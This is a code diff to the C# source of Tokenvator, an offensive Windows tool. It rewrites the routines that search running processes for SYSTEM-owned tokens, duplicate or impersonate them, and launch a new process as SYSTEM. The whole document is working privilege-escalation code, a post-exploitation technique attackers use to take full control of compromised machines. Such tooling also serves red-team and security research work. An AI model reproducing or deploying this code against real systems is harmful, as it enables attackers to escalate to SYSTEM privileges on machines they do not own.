@@ -12,6 +12,7 @@ using Tokenvator.Plugins.Enumeration;
 using Tokenvator.Plugins.Execution;
 
 using MonkeyWorks.Unmanaged.Headers;
+using System.Diagnostics;
 //using MonkeyWorks.Unmanaged.Libraries;
 
 namespace Tokenvator.Plugins.AccessTokens
@@ -58,6 +59,7 @@ namespace Tokenvator.Plugins.AccessTokens
         /// <summary>
         /// Starts a process with a duplicated SYSTEM Token
         /// No conversions required
+        /// Removed references to UserSessions
         /// </summary>
         /// <returns>Returns true if process was successfully started</returns>
         ////////////////////////////////////////////////////////////////////////////////
@@ -69,31 +71,36 @@ namespace Tokenvator.Plugins.AccessTokens
                 NTAccount systemAccount = (NTAccount)securityIdentifier.Translate(typeof(NTAccount));
 
                 Console.WriteLine("[*] Searching for {0}", systemAccount.ToString());
-                processes = UserSessions.EnumerateUserProcesses(false, systemAccount.ToString());
+                using (TokenInformation ti = new TokenInformation(IntPtr.Zero))
+                {
+                    foreach (Process p in Process.GetProcesses())
+                    {
+                        ti.OpenProcessToken(p.Id, false);
+                        ti.SetWorkingTokenToRemote();
+                        string userName = ti.GetTokenUser(false);
+                        if (userName.Contains(systemAccount.ToString(), StringComparison.OrdinalIgnoreCase))
+                        {
+                            hExistingToken = ti.GetWorkingToken();
+
+                            SetWorkingTokenToRemote();
+                            if (!DuplicateToken(Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
+                            {
+                                continue;
+                            }
+
+                            SetWorkingTokenToNewToken();
+                            if (StartProcessAsUser(newProcess))
+                            {
+                                return true;
+                            }
+                        }
+                    }
+                }
             }
             catch (Exception ex)
             {
                 Console.WriteLine(ex.Message);
                 return false;
-            }
-
-            foreach (uint process in processes.Keys)
-            {
-                if (!OpenProcessToken((int)process))
-                {
-                    continue;
-                }
-
-                SetWorkingTokenToRemote();
-
-                if (DuplicateToken(Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
-                {
-                    SetWorkingTokenToNewToken();
-                    if (StartProcessAsUser(newProcess))
-                    {
-                        return true;
-                    }
-                }
             }
 
             Misc.GetWin32Error("GetSystem");
@@ -115,7 +122,25 @@ namespace Tokenvator.Plugins.AccessTokens
                 NTAccount systemAccount = (NTAccount)securityIdentifier.Translate(typeof(NTAccount));
 
                 Console.WriteLine("[*] Searching for {0}", systemAccount.ToString());
-                processes = UserSessions.EnumerateUserProcesses(false, systemAccount.ToString());
+                using (TokenInformation ti = new TokenInformation(IntPtr.Zero))
+                {
+                    foreach (Process p in Process.GetProcesses())
+                    {
+                        ti.OpenProcessToken(p.Id, false);
+                        ti.SetWorkingTokenToRemote();
+                        string userName = ti.GetTokenUser(false);
+                        if (userName.Contains(systemAccount.ToString(), StringComparison.OrdinalIgnoreCase))
+                        {
+                            hExistingToken = ti.GetWorkingToken();
+                            SetWorkingTokenToRemote();
+
+                            if (ImpersonateUser())
+                            {
+                                return true;
+                            }
+                        }
+                    }
+                }
             }
             catch (Exception ex)
             {
@@ -123,20 +148,6 @@ namespace Tokenvator.Plugins.AccessTokens
                 return false;
             }
 
-            foreach (uint process in processes.Keys)
-            {
-                if (!OpenProcessToken((int)process))
-                {
-                     continue;
-                }
-
-                SetWorkingTokenToRemote();
-
-                if (ImpersonateUser())
-                {
-                    return true;
-                }
-            }
             return false;
         }
 
